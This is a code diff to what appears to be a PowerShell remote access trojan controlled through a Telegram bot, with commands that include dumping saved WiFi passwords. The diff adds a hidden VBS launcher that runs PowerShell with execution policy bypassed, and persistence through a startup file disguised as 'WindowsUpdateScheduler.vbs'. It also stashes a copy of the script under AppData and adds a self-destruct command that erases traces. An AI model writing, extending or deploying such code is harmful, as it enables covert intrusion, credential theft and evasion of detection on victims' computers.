@@ -13,12 +13,21 @@ if (-not $env:PS_RUN_HIDDEN -or $env:PS_RUN_HIDDEN -ne "1") {
         [System.IO.File]::WriteAllText($scriptPath, $MyInvocation.Line)
     }
 
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "powershell.exe"
-    $psi.Arguments = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`" -PS_RUN_HIDDEN 1"
-    $psi.WindowStyle = 'Hidden'
-    $psi.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    # Create a VBS launcher to run PowerShell completely hidden
+    $vbsPath = "$env:TEMP\__launcher_$(Get-Random).vbs"
+    $vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""$scriptPath"" -PS_RUN_HIDDEN 1", 0, False
+"@
+    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
+    
+    # Run the VBS launcher which will hide everything
+    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
+    
+    # Clean up the VBS launcher after a short delay
+    Start-Sleep -Seconds 2
+    Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
+    
     exit
 }
 
@@ -266,6 +275,56 @@ function Set-ClipboardContent {
     }
 }
 
+function Invoke-SelfDestruct {
+    param (
+        [string]$chatId
+    )
+    
+    try {
+        # Get paths
+        $scriptName = [System.IO.Path]::GetFileName($MyInvocation.MyCommand.Path)
+        $startupFolder = [System.Environment]::GetFolderPath('Startup')
+        $vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"
+        $hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
+        
+        # Send initial message
+        Send-TelegramMessage -chatId $chatId -message "Self-destruct initiated. Removing persistence..."
+        
+        # Remove VBS launcher from startup folder
+        if (Test-Path $vbsLauncherPath) {
+            Remove-Item $vbsLauncherPath -Force -ErrorAction SilentlyContinue
+            Send-TelegramMessage -chatId $chatId -message "Removed startup launcher."
+        }
+        
+        # Remove hidden script from AppData
+        if (Test-Path $hiddenScriptPath) {
+            Remove-Item $hiddenScriptPath -Force -ErrorAction SilentlyContinue
+            Send-TelegramMessage -chatId $chatId -message "Removed hidden script copy."
+        }
+        
+        # Create a cleanup script that will delete the original script after this process ends
+        $cleanupScript = @"
+Start-Sleep -Seconds 3
+Remove-Item -Path "$($MyInvocation.MyCommand.Path)" -Force
+"@
+        
+        $cleanupPath = "$env:TEMP\cleanup_$(Get-Random).ps1"
+        [System.IO.File]::WriteAllText($cleanupPath, $cleanupScript)
+        
+        # Start the cleanup script in a hidden window
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$cleanupPath`"" -WindowStyle Hidden
+        
+        # Final message before termination
+        Send-TelegramMessage -chatId $chatId -message "Self-destruct complete. Script will terminate now."
+        
+        # Exit the script
+        exit
+    }
+    catch {
+        Send-TelegramMessage -chatId $chatId -message "Error during self-destruct: $_"
+    }
+}
+
 function Send-HelpMessage {
     param ([string]$chatId)
     $helpMessage = @"
@@ -286,6 +345,7 @@ Available Commands:
 /setclipboard <text> - Sets text to clipboard.
 /sysinfo - Displays detailed system information.
 /wifi - Shows all saved WiFi networks and passwords.
+/selfdestruct - Removes all traces of the script and terminates.
 cd <path> - Change directory.
 cd - Show current directory.
 ls or dir - List files and folders.
@@ -300,16 +360,23 @@ $scriptPath = $MyInvocation.MyCommand.Path
 $scriptName = [System.IO.Path]::GetFileName($scriptPath)
 $startupFolder = [System.Environment]::GetFolderPath('Startup')
 $destinationPath = Join-Path $startupFolder $scriptName
-if (-not (Test-Path $destinationPath)) {
-    Copy-Item -Path $scriptPath -Destination $destinationPath
+
+# Use a legitimate-sounding name for the VBS launcher
+$vbsLauncherPath = Join-Path $startupFolder "WindowsUpdateScheduler.vbs"
+
+# Copy the script to a hidden location instead of startup folder
+$hiddenScriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
+if (-not (Test-Path $hiddenScriptPath)) {
+    Copy-Item -Path $scriptPath -Destination $hiddenScriptPath
 }
 
-# Create a shortcut in startup folder
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut([System.IO.Path]::Combine($startupFolder, "$scriptName.lnk"))
-$shortcut.TargetPath = "powershell.exe"
-$shortcut.Arguments = "-WindowStyle Hidden -File `"$destinationPath`""
-$shortcut.Save()
+# Create a VBS launcher that will run the PowerShell script completely hidden
+$vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File ""$hiddenScriptPath"" -PS_RUN_HIDDEN 1", 0, False
+"@
+[System.IO.File]::WriteAllText($vbsLauncherPath, $vbsContent)
+
 
 # Set initial directory
 $global:CurrentDirectory = (Get-Location).Path
@@ -438,6 +505,16 @@ while ($true) {
             elseif ($text -eq "/wifi") {
                 $wifiPasswords = Get-WifiPasswords
                 $reply = $wifiPasswords
+            }
+            elseif ($text -eq "/selfdestruct") {
+                # Ask for confirmation before self-destructing
+                Send-TelegramMessage -chatId $chatId -message "Are you sure you want to remove all traces of this script? Send '/confirm-selfdestruct' to confirm."
+                continue
+            }
+            elseif ($text -eq "/confirm-selfdestruct") {
+                Invoke-SelfDestruct -chatId $chatId
+                # No need for further processing as the script will exit
+                continue
             }
             else {
                 $reply = "Unknown command."
